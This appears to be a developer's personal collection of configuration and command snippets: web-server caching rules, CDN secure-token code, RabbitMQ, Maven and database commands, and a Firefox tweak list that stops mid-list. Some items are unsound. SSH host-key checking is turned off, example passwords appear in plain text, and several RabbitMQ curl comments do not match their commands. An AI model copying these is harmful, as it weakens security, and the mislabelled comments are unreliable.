gzip_types application/javascript application/rss+xml application/vnd.ms-fontobject application/x-font application/x-font-opentype application/x-font-otf application/x-font-truetype application/x-font-ttf application/x-javascript application/xhtml+xml application/xml font/opentype font/otf font/ttf image/svg+xml image/x-icon text/css text/javascript text/plain text/xml;
--------------------------------------------------------------------------------------------------------
location ~* \.(png|jpg|jpeg|gif)$ {
    expires 365d;
    add_header Cache-Control "public, no-transform";
}

location ~* \.(js|css|pdf|html|swf)$ {
    expires 30d;
    add_header Cache-Control "public, no-transform";
}

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=2592000, public"
</filesMatch>

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##
--------------------------------------------------------------------------------------------------------
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://cdn.yourdomain.com/local-ga.js', 'ga');

    ga('create', 'UA-xxxxxxx-x', 'auto');
    ga('send', 'pageview');
</script>
--------------------------------------------------------------------------------------------------------
function remove_querystring_var($url, $key) {
    $url = preg_replace('/(.*)(?|&)' . $key . '=[^&]+?(&)(.*)/i', '$1$2$4', $url . '&');
    $url = substr($url, 0, -1);
    return ($url);
}
--------------------------------------------------------------------------------------------------------
<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
--------------------------------------------------------------------------------------------------------
server {
    set $cache_uri $request_uri;

    # bypass cache if POST requests or URLs with a query string
    if ($request_method = POST) {
        set $cache_uri 'nullcache';
    }

    if ($query_string != "") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if URLs containing the following strings
    if ($request_uri ~* "(/wp-admin/|/xmlrpc.php|/wp-(app|cron|login|register|mail).php|wp-.*.php|/feed/|index.php|wp-comments-popup.php|wp-links-opml.php|wp-locations.php|sitemap(index)?.xml|[a-z0-9-]+-sitemap([0-9]+)?.xml)") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if the cookies containing the following strings
    if ($http_cookie ~* "comment_author|wordpress_[a-f0-9]+|wp-postpass|wordpress_logged_in") {
        set $cache_uri 'nullcache';
    }

    # custom sub directory e.g. /blog
    set $custom_subdir '';

    # default html file
    set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index.html';

    # webp html file
    if ($http_accept ~* "image/webp") {
        set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index-webp.html';
    }

    location / {
        gzip_static on; # this directive is not required but recommended
        try_files $cache_enabler_uri $uri $uri/ $custom_subdir/index.php?$args;
    }

    ...
}

# BEGIN Cache Enabler
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # set blog sub path
    SetEnvIf Request_URI "^(.*)$" SUB_PATH=/wp-content/cache/cache-enabler/

    # set Cache Enabler path
    SetEnvIf Request_URI "^(.*)$" CE_PATH=$1

    <IfModule mod_mime.c>
        # webp HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{HTTP:Accept} image/webp
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz [L]

        # gzip HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz [L]

        AddType text/html .gz
        AddEncoding gzip .gz
    </IfModule>

    # webp HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{HTTP:Accept} image/webp
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html [L]

    # default HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html [L]
</IfModule>
# END Cache Enabler

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Cache-Control: max-age=84600');
--------------------------------------------------------------------------------------------------------
sudo apt-get update
sudo apt-get install lsyncd

vi /etc/lsyncd.lua

settings {
    logfile = "/var/log/lsyncd/lsyncd.log",
    statusFile = "/var/log/lsyncd/lsyncd-status.log",
    statusInterval = 20
}

sync {
    default.rsync,
    source="full path to your directory",
    target="username_for_keyCDN@rsync.keycdn.com:YOURZONE/",
    rsync = {
        archive = false,
        acls = false,
        chmod = "D2755,F644"
        compress = true,
        links = false,
        owner = false,
        perms = false,
        verbose = true,
        rsh = "/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no"
    }
}
--------------------------------------------------------------------------------------------------------
sudo apt-get install mtr
yum install mtr
pacman -S mtr
brew install mtr

mtr --report domainx.com
mtr -n --report 8.8.8.8
--------------------------------------------------------------------------------------------------------
Open the rsyslog conf file and add the following lines

vi /etc/rsyslog.conf

# provides UDP syslog reception
module(load="imudp")
Create and open your custom config file.

vi /etc/rsyslog.d/00-custom.conf
# Templates
template(name="ReceiveFormat" type="string" string="%msg:39:$%\n")

# UDP ruleset mapping
input(type="imudp" port="514" ruleset="customRuleset")

# Custom ruleset
ruleset(name="customRuleset") {
    if ($msg contains '366c3df6-93dd-4ec0-a218-aec9d191c59e') then {
        /var/log/cdn.log;ReceiveFormat
        stop
    }
}

service rsyslog restart
netstat -na | grep ":<defined port>"
tcpdump port <defined port>
tail -f /var/log/cdn.log
--------------------------------------------------------------------------------------------------------
echo QUIT | openssl s_client -connect cdn.yourdomain.com:443 -servername cdn.yourdomain.com -tls1 -tlsextdebug -status
echo -n '{path}{secret}{timestamp}' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
echo -n '/path/to/file1.jpgmysecret1384719072' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
--------------------------------------------------------------------------------------------------------
var crypto = require('crypto'),
    secret = 'your_secret',
    path = '/path/to/your/file.jpg';

// define expiry (e.g. 120 seconds)
var expire = Math.round(Date.now()/1000) + 120;

// generate md5 token
var md5String = crypto
    .createHash("md5")
    .update(path + secret + expire)
    .digest("binary");

// encode and format md5 token
var token = new Buffer(md5String, 'binary').toString('base64');
token = token.replace(/\+/g, '-').replace(/\//g, '_').replace(/\=/g, '');

// return secure token
console.log('http://demo-1.kxcdn.com' + path + '?token=' + token + '&expire=' + expire);
--------------------------------------------------------------------------------------------------------
require 'digest/md5'
require 'base64'

secret = 'your_secret'
path = '/path/to/your/file.jpg'

# expiry time in seconds (e.g. 3600 seconds)
expire = Time.now.to_i + 3600
token = Base64.encode64(
    Digest::MD5.digest(
        "#{path}#{secret}#{expire}"
    )
).gsub("\n", "").gsub("+", "-").gsub("/", "_").gsub("=", "")

# final secured URL
url = "http://demo-1.kxcdn.com#{path}?token=#{token}&expire=#{expire}"

puts url
--------------------------------------------------------------------------------------------------------
import base64
from hashlib import md5
from time import time

secret = 'your_secret'
path = "/path/to/file1.jpg"

# expiration in seconds (e.g. 180 seconds)
expire = int(time()) + 180

# generate token
token = base64.encodestring(
    md5(
        "%s%s%s" % (path, secret, expire)
    ).digest()
).replace("\n", "").replace("+", "-").replace("/", "_").replace("=", "")
secured_url = "http://demo-1.kxcdn.com%s?token=%s&expire=%s" % (path, token, expire)

# return secured URL
print secured_url
--------------------------------------------------------------------------------------------------------
<?php
    $secret = 'securetokenkey';
    $path = '/path/to/file1.jpg';

    // Expiration in seconds (e.g. 90 seconds)
    $expire = time() + 90;

    // Generate token
    $md5 = md5($path.$secret.$expire, true);

    $md5 = base64_encode($md5);
    $md5 = strtr($md5, '+/', '-_');
    $md5 = str_replace('=', '', $md5);

    // Use this URL
    $url = "http://yourzone-id.kxcdn.com{$path}?token={$md5}&expire={$expire}";

    echo $url;
?>
--------------------------------------------------------------------------------------------------------
kafka-topics.sh --zookeeper <host,host,host> --topic flume-channel --partitions 1 --replication-factor 2 --create
kafka-console-consumer.sh --bootstrap-server <host,host,host> --topic flume-channel --group flume-channel-consumers --from-beginning
--------------------------------------------------------------------------------------------------------
docker run -p "25:25" -p "143:143" linagora/james-jpa-sample:3.3.0
--------------------------------------------------------------------------------------------------------
DISM /Online /Cleanup-Image /RestoreHealth
Get-AppxPackage -AllUsers| Foreach {Add-AppxPackage -DisableDevelopmentMode -Register “$($_.InstallLocation)\AppXManifest.xml”}
--------------------------------------------------------------------------------------------------------
cmd.exe /k echo WELCOME
--------------------------------------------------------------------------------------------------------git clone https://github.com/armdev/springboot2-swagger.git
cd springboot2-swagger.git
mvn spring-boot:run -P update-sourcepath-for-lombok
firefox localhost:4545/swagger-ui.html
--------------------------------------------------------------------------------------------------------
#!/bin/bash

# ======================================
# ANSI
# ======================================
ansi_reset='\e[0m'

blue='\e[34m'

yellow_b='\e[1;33m'

red_b='\e[1;31m'


# ======================================
# Constants
# ======================================
svg_source="icons.svg"

svg_src_tmp="/tmp/icons.svg"

default_color="#4078c0"

default_size=32

icon_index="index.txt"


# ======================================
# User Input
# ======================================
echo "Enter icon size (skip for default icon dimensions): "
read -r icon_size

echo "Enter 1 or more colors (space or tab separated): "
read -r -a icon_color


# ======================================
# Checks
# ======================================
# If no colors given, add default color to array
[ ${#icon_color[*]} -eq 0 ] && icon_color[0]=$default_color

icon_size=${icon_size:-"$default_size"}


# ======================================
# RENDER
# ======================================
for color in ${icon_color[*]}; do

    mkdir -p "${color}__$icon_size"


    trap 'rm $svg_src_tmp; exit' INT TERM


    cp "$svg_source" "$svg_src_tmp"


    # Change color of temp copy
    [ ! "$color" = "$default_color" ] &&
    sed -i "s/$default_color/$color/" "$svg_src_tmp"


    # Loop through index.txt & render png's
    while read -r i; do

        if [ -f "${color}__$icon_size/$i.png" ]; then
            echo -e "${red_b}${color}__$icon_size/$i.png exists.${ansi_reset}"

        else
            echo
            echo -e "${blue}Rendering ${yellow_b}${color}__$icon_size/$i.png${ansi_reset}"
            inkscape --export-id="${i}" \
                     --export-id-only \
                     --export-width="$icon_size" --export-height="$icon_size" \
                     --export-png="${color}__$icon_size/$i.png" "$svg_src_tmp" >/dev/null
        fi
    done < "$icon_index"


    # Remove copy before next iteration or EXIT
    rm "$svg_src_tmp"

done


# If notify-send installed, send notif
hash notify-send 2>/dev/null &&
notify-send -i 'terminal' \
            -a 'Terminal' \
            'Terminal'    \
            'Finished rendering icons!'
--------------------------------------------------------------------------------------------------------
sudo apt install oracle-java11-set-default
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Database
--------------------------------------------------------------------------------------------------------
"c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone --console
--------------------------------------------------------------------------------------------------------
CREATE ROLE ivs NOINHERIT NOREPLICATION LOGIN PASSWORD 'user_ivs';
--------------------------------------------------------------------------------------------------------
UPDATE SET date_from=now() AT TIME ZONE 'GMT'
date_from timestamp without time zone
SELECT date_from AT TIME ZONE 'GMT'
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS templates (
  id UUID PRIMARY KEY,
  name VARCHAR(255) NOT NULL,
  content BYTEA NOT NULL
);

CREATE TABLE IF NOT EXISTS images (
  id UUID PRIMARY KEY,
  template_id UUID,
  name VARCHAR(255),
  content BYTEA NOT NULL,
  foreign key (template_id) references templates on delete cascade
);

create or replace function bytea_import(p_path text, p_result out bytea)
                   language plpgsql as $$
declare
  l_oid oid;
begin
  select lo_import(p_path) into l_oid;
  select lo_get(l_oid) INTO p_result;
  perform lo_unlink(l_oid);
end;$$;
--------------------------------------------------------------------------------------------------------
create database activiti
CHARACTER SET utf8
COLLATE utf8_bin;

create database activitiadmin
CHARACTER SET utf8
COLLATE utf8_bin;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Maven & Gradle
--------------------------------------------------------------------------------------------------------
mvn clean install -DskipTest
cd core
mvn liquibase:update
--------------------------------------------------------------------------------------------------------
mvn clean test -pl streamflyer-core jacoco:report coveralls:report -Pcoverage
mvn clean dependency:copy-dependencies package
mvn site
mvn license:format
--------------------------------------------------------------------------------------------------------
mvn enforcer:display-info
mvn enforcer:enforce
--------------------------------------------------------------------------------------------------------
$ mvn archetype:generate -DgroupId=com.example
 -DartifactId=demo
 -DarchetypeArtifactId=maven-archetype-webapp
 -DinteractiveMode=false
--------------------------------------------------------------------------------------------------------
mvn verify cargo:run
docker-compose up mongodb
mvn spring-boot:run
--------------------------------------------------------------------------------------------------------
gradlew clean build publishToMavenLocal -i -x test
--------------------------------------------------------------------------------------------------------
gradle dependencies
mvn dependency:tree
--------------------------------------------------------------------------------------------------------
mvn license:update-file-header
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### RabbitMQ
--------------------------------------------------------------------------------------------------------
# sbin/rabbitmqctl stop
rabbitmqctl list_permissions --vhost gw1
rabbitmqctl list_permissions --vhost /
# sbin/rabbitmq-server -detached

http://localhost:15672/
# sbin/rabbitmq-plugins enable rabbitmq_management
sbin/rabbitmqctl status
sbin/rabbitmqctl stop
chkconfig --list | grep -i qpid
chkconfig qpidd off
chkconfig --list | grep -i qpid

cd /usr/save
wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.0.4/rabbitmq-server-generic-unix-3.0.4.tar.gz
tar xvfz rabbitmq-server-generic-unix-3.0.4.tar.gz
cd rabbitmq_server-3.0.4

# cd /usr/save/rabbitmq_server-3.0.4
# sbin/rabbitmq-server -detached
--------------------------------------------------------------------------------------------------------
rabbitmqctl add_user userivs ivs
rabbitmqctl set_user_tags userivs administrator
rabbitmqctl set_permissions -p / userivs ".*" ".*" ".*"
rabbitmq-plugins enable rabbitmq_management

## Get a list of vhosts:
curl -i -u userivs:ivs http://localhost:15672/api/whoami
## Get a list of channels, fast publishers first, restricting the info items we get back:
curl -i -u guest:guest http://localhost:15672/api/vhosts
## Create a new vhost:
curl -i -u guest:guest "http://localhost:15672/api/channels?sort=message_stats.publish_details.rate&sort_reverse=true&columns=name,message_stats.publish_details.rate,message_stats.deliver_get_details.rate"
# Create a new exchange in the default virtual host:
curl -i -u guest:guest -H "content-type:application/json" -XPUT http://localhost:15672/api/vhosts/foo
## Delete exchange again:
curl -i -u guest:guest -H "content-type:application/json" -XDELETE http://localhost:15672/api/exchanges/%2F/my-new-exchange

sbin/rabbitmqctl stop
sbin/rabbitmq-server -detached
# sbin/rabbitmqctl status
--------------------------------------------------------------------------------------------------------
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" start & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" stop & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" remove & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" install & if not errorlevel 1 exit /b 0
--------------------------------------------------------------------------------------------------------
mvn clean package -Pprod
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### DEVELOPMENT
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(
  classes = AppConfig.class,
  loader = AnnotationConfigContextLoader.class)
public class SpringRetryTest {
    @Autowired
    private MyService myService;

    @Autowired
    private RetryTemplate retryTemplate;

    @Test(expected = RuntimeException.class)
    public void givenTemplateRetryService_whenCallWithException_thenRetry() {
        retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });
    }
}
    @Autowired
    private RetryTemplate retryTemplate;

    retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });               

   retryTemplate.execute(new RetryCallback<Void, RuntimeException>() {
    @Override
    public Void doWithRetry(RetryContext arg0) {
        myService.templateRetryService();
    }
});
--------------------------------------------------------------------------------------------------------
1. Change Number of Content Processes

Do you like to work with a lot of tabs open at any one time, or do you rarely have more than, say, 5 tabs open? The more content processes you have, the more CPU resources will be assigned to each tab (which will also use more RAM).

If you have a powerful PC, then you can set this at a reasonably high number, which should improve the stability and performance of each open tab in Firefox. The name of this setting in about:config is dom.ipc.processCount

Default value: 4

Modified value: 7-12 (depending on number of tabs you usually have open)
2. Disable Unnecessary Animations

Animations in Firefox Quantum are not a bad thing, but if you have an old PC where every MB of RAM counts or simply don’t need these animated flourishes, you can disable them by going to toolkit.cosmeticAnimations.enabled and setting the value to “false.”

Default value: true
Modified value: false
3. Change Minimum Tab Width

It will take a more sharp-eyed Firefox user to notice this adjustment Mozilla made for Firefox Quantum. The default tab width is now just 76 pixels, whereas before it was 100. To adjust this, go to browser.tabs.tabMinWidth.

Default value: 76
Modified value: 100 if you want the same tab width as in older versions of Firefox, but really you can make this whatever you like. Just don’t go overboard!
4. Reduce Session History Cache, Save RAM

If you’re using an older machine, then even the typically speedy Firefox may slow down your PC with the default settings. This could be in part because of how it stores Web pages in its short-term memory (or RAM), which you can access using the Back and Forward buttons.

firefox-about-config-sessionhistory

The preference browser.sessionhistory.max_total_viewers affects how many pages Firefox stores in such a way that they load super fast.

Default value: – 1 (adaptable)
Modified value: any number, reflecting the number of pages you want to store. (We recommend less than 4 if your PC is struggling for speed, while those with 4GB plus can go for 8 or more.)

The preference browser.sessionhistory.max_entries affects how many pages each tab stores in its Back/Forward history altogether.

Default value: 50
Modified value:If your PC is struggling, lower this to 25, check if it helps, then adjust accordingly.
5. Disable Extension Compatibility Checks

Compatibility checks. Who needs ’em, right? Actually they’re pretty handy as a general reference of which extensions will work with your version of Firefox and which won’t, but Firefox doesn’t always get it right. If you want to see whether an extension that Firefox claims is incompatible may actually work, do the following:

    Right-click anywhere on the about:config page, then click “New -> Boolean”
    Type extensions.checkCompatibility into the box, click OK, then select “false” and click OK again.
    This preference will now exist in your list, and you can disable it at any time by right-clicking it and clicking “Reset.”

about-config-disable-compatibility-check
6. Change Firefox Download Location

By default, Firefox downloads go to the Windows “Downloads” folder, but you can change this by tweaking browser.download.folderList

Default value: 1
Modified values:

    0 – Saves all downloads to the desktop
    2 – Saves to the same location as the previous download

7. Get Asked Where You Want Each Download Saved

If you want to have more direct control over your downloads and decide what directory you want each one to be saved in, change the preference browser.download.useDownloadDir to “false.”

Default value: true
Modified value: false – prompts you where to save each download

about-config-firefox-tricks-download-locations
8. Open New Tab for Search Box Results

By default, the things you search for in the Firefox search box open in the current tab. To open in a new tab instead, you’ll need to modify browser.search.openintab

Default value: false – opens search results in current tab
Modified value: true – opens search results in new tab
9. New Tabs Page

Firefox’s New Tabs page organizes all the sites you’ve bookmarked and are most likely to visit in a convenient grid. Best of all, you can tweak how big this grid is, so while it uses 3×3 thumbnails by default, you can change it thanks to the browser.newtabpage.rows and browser.newtabpage.columns preferences.

Default value: 3 in “rows,” 5 in “columns”
Modified values: Whatever number you like!

about-config-firefox-tricks-change-columns
10. Adjust the Smart Location Bar’s Number of Suggestions

In Firefox when you start typing in the location (or URL) bar, a dropdown list of suggested sites will be shown. If you want it to show more (or less) than ten suggestions, you can adjust the browser.urlbar.maxRichResults keys and get it to show the number you want.

Default value: 10
Modified value: Set to your desired number of suggestions. If you want to disable it altogether, set it to -1.
11. Adjust the Session Restore Saving Frequency

Firefox saves your session every fifteen seconds by default, but you can change the value of browser.sessionstore.interval so that Firefox will save the session at a longer interval.

Default: 15000 (in msecs, equivalent to fifteen seconds)
Modified value: Set it to your desired value. 1000 means one sec, and 60000 means one minute
12. Extend Scripts’ Execution Time

In Firefox a script is only given ten seconds to respond, after which it will issue an unresponsive script warning. If you are stuck on a slow network connection, you might want to increase the script execution time via dom.max_script_run_time to cut down on the frequency of the no-script warning.

Default value: 10 (in secs)
Modified value: 20, or any value greater than 10
13. Handling JavaScript Popups

When you come across a site that executes a javascript, open a new window function, and if the popup window is without all the usual window features, e.g. back/forward/reload buttons, status bar, etc., Firefox will automatically treat it as a popup and will not open it as a new tab. However, if you find this to be a nuisance and want to open all new windows in new tabs, you can specify it via the browser.link.open_newwindow.restriction setting.

Default value: 2 – Open all JavaScript windows the same way you have Firefox handle new windows unless the JavaScript call specifies how to display the window

Modified values:

    0 – open all links the way you have Firefox handle new windows
    1 – do not open any new windows
    2 – open all links the way you have Firefox handle new windows unless Javascript specifies how to display the window

14. Enable Spell-Checking in All Text Fields

